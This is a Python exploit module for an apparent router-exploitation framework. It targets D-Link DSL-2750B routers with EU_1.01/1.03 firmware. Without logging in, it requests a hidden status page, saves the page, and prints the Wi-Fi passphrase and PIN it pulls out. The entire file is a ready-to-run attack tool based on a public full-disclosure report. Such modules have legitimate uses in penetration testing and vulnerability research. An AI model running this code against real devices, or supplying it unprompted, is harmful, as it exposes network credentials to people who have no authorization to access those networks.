# Name:D-link DSL-2750B EU_1.01 information disclosure
# File:dsl_2750b_info.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 18.07.2016
# Last modified: 18.07.2016
# Shodan Dork:
# Description: An attacker is able to obtain critical information (Wifi passphrase, pin) without being logged in.
# Based on: http://seclists.org/fulldisclosure/2015/May/129

import core.Exploit
import core.io

import re
import requests
from interface.messages import print_error, print_success, print_green, print_warning


class Exploit(core.Exploit.RextExploit):
    """
Name:D-link DSL-2750B EU_1.01 and EU_1.03 information disclosure
File:dsl_2750b_info.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 18.07.2016
Description: An attacker is able to obtain critical information (Wifi passphrase, pin) without being logged in.
             it looks like EU_1.01 returns data in different format than EU_1.03
Based on: http://seclists.org/fulldisclosure/2015/May/129

Options:
    Name        Description

    host        Target host address
    port        Target port
    """

    def __init__(self):
        core.Exploit.RextExploit.__init__(self)

    def do_run(self, e):
        url = "http://%s:%s/hidden_info.html" % (self.host, self.port)

        try:
            print_warning("Sending exploit")
            response = requests.get(url, timeout=60)
            if "Manufacture Information" in response.text:
                print_success("information obtained, writing response into hidden_info.html")
                core.io.writetextfile(response.text, "hidden_info.html")
                print_warning("Please check file, response seems to depend on FW version, parsing may not be accurate")
                value = re.findall("str =\(\"\[\{(.*)\}", response.text)
                value = value[0].split(',')
                for i in value:
                    print_green(i)
            else:
                print_error("exploit failed")
        except requests.Timeout:
            print_error("timeout")
        except requests.ConnectionError:
            print_error("exploit failed")
Exploit()
